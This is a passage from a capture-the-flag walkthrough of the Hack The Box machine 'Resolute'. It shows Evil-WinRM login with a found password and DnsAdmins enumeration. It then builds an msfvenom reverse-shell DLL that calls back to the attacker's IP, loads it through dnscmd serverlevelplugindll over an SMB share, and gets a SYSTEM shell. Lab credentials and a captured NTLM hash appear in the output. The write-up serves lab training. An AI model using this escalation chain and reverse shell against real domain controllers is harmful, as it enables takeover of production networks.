cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
...
```

Now, I checked whether `ryan`  belonged to the `Remote Management Use` group but he wasnt. Apparently he was in `Contractors` group which was indeed a part of `Remote Management Use` group.

```bash

*Evil-WinRM* PS C:\PSTranscripts\20191203> net user ryan
User name                    ryan
Full Name                    Ryan Bertrand
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/25/2024 11:23:02 PM
Password expires             Never
Password changeable          1/26/2024 11:23:02 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Contractors
The command completed successfully.
```

```bash
*Evil-WinRM* PS C:\PSTranscripts\20191203> net localgroup "Remote Management Users"
Alias name     Remote Management Users
Comment        Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.

Members

-------------------------------------------------------------------------------
Contractors
melanie
The command completed successfully.
```

### So i tried to `EvilWinRM` using `ryan's` credentials and I was able to login

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/resolute]
└─$ evil-winrm -i 10.10.10.169 -u ryan -p 'Serv3r4Admin4cc123!' 
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents> whoami
megabank\ryan
```

Found a `note.txt` on Ryan’s desktop. So according to the note, any changes I make to the system will have to be completely used within a minute (or less).

```bash
*Evil-WinRM* PS C:\Users\ryan\Documents> dir
*Evil-WinRM* PS C:\Users\ryan\Documents> ls -force

    Directory: C:\Users\ryan\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hsl        9/27/2019   7:05 AM                My Music
d--hsl        9/27/2019   7:05 AM                My Pictures
d--hsl        9/27/2019   7:05 AM                My Videos

*Evil-WinRM* PS C:\Users\ryan\Documents> cd ..
*Evil-WinRM* PS C:\Users\ryan> cd Desktop
*Evil-WinRM* PS C:\Users\ryan\Desktop> dir

    Directory: C:\Users\ryan\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        12/3/2019   7:34 AM            155 note.txt

*Evil-WinRM* PS C:\Users\ryan\Desktop> type note.txt
Email to team:

- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
```

Keeping the note in mind, I tried looking at the groups ryan was in: 

```bash
*Evil-WinRM* PS C:\Users\ryan\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```

The [`Microsoft Documentation`](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-dnsadmins) describes this `DnsAdmins` as:

> Members of DNSAdmins group have access to network DNS information. The default permissions are as follows: Allow: Read, Write, Create All Child objects, Delete Child objects, Special Permissions.

### Vulnerability

Some googling around for this group led me to the [lolbas page](https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/) for `dnscmd` to load a dll over a UNC path. There’s a command to set a server level plugin dll:

```bash
dnscmd.exe /config /serverlevelplugindll \\path\to\dll
```

From [this blog post](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83):

> *First, trying to run this as a weak domain user with no special permissions on the DNS server object (other than Generic Read, which is granted to all members of the Pre-Windows 2000 Compatible Access group, which by default contains the Domain Users group), the command fails with an access denied message. If we give our weak user write access to the server object, the command no longer fails. This means that members of DnsAdmins can successfully run this command.*
> 

Now that since, Ryan is in `DnsAdmins`, we can use this exploit to escalate our privileges.

The attack:

> The attack here is to tell the DNS service on Resolute to use my dll as a plugin. I’m going to use `msfvenom` to create a dll that will, on loading, connect back to me. When `msfvenom` creates this payload, it will connect back, and wait for that session to end before continuing. To get around this, you can create a payload that starts the reverse shell in a new thread, and then continues, so that the DNS server can continue to start.
> 

`Creating the Payload:`

```bash
┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/resolute/exploit]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f dll -o rev.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
Saved as: rev.dll
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/resolute/exploit]
└─$ file rev.dll      
rev.dll: PE32+ executable (DLL) (GUI) x86-64, for MS Windows, 5 sections
```

Now, from that same directory, I’ll run an `SMB server`:

```bash
┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/resolute/exploit]
└─$ python3 smbserver.py s .
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Now that we’ve completed all the pre-requisites for the attack, we need to perform the following `3` steps on the victim’s machine along with a `netcat` listener open on our end.

`NOTE: we need to complete these step within a minute so that the script is no reset to default.`

1. Set the server level plugin to be `rev.dll` on my share.
2. Stop the DNS server.
3. Start the DNS server.

```bash
1. dnscmd.exe /config /serverlevelplugindll \\10.10.14.10\s\rev.dll

2. sc.exe \\resolute stop dns

3. sc.exe \\resolute start dns
```

```bash
*Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd.exe /config /serverlevelplugindll \\10.10.14.10\s\rev.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.

*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe \\resolute stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe \\resolute start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3608
        FLAGS              :
```

Once done, first we’ll see the connection on the SMB server:

```bash
┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/resolute/exploit]
└─$ python3 smbserver.py s .
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.169,57694)
[*] AUTHENTICATE_MESSAGE (MEGABANK\RESOLUTE$,RESOLUTE)
[*] User RESOLUTE\RESOLUTE$ authenticated successfully
[*] RESOLUTE$::MEGABANK:aaaaaaaaaaaaaaaa:e2b1410e4189d85b0b1418524384790d:010100000000000080e9fa954750da013a4f2ccacbf5d27300000000010010006c007600660051007500490074007800030010006c007600660051007500490074007800020010007700480047006800540071007900650004001000770048004700680054007100790065000700080080e9fa954750da01060004000200000008003000300000000000000000000000004000000f0c748543a1105389ebe9666a2e63fff2cb9c37a6429b20160efb973ba6f76c0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310030000000000000000000
[*] Disconnecting Share(1:S)
[*] Closing down connection (10.10.10.169,57694)
[*] Remaining connections []
```

Then we’ll get a shell:

```bash
┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/resolute/exploit]
└─$ nc -lvnp 443 
listening on [any] 443 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.169] 57695
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

ROOT Flag

```bash
C:\Windows\system32>cd ..
cd ..
cd
C:\Windows> ..
cd ..

C:\>cd Users
cd Users

C:\Users>cd Administrator
cd Administrator

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>type root.txt
type root.txt
...SNIP...
```
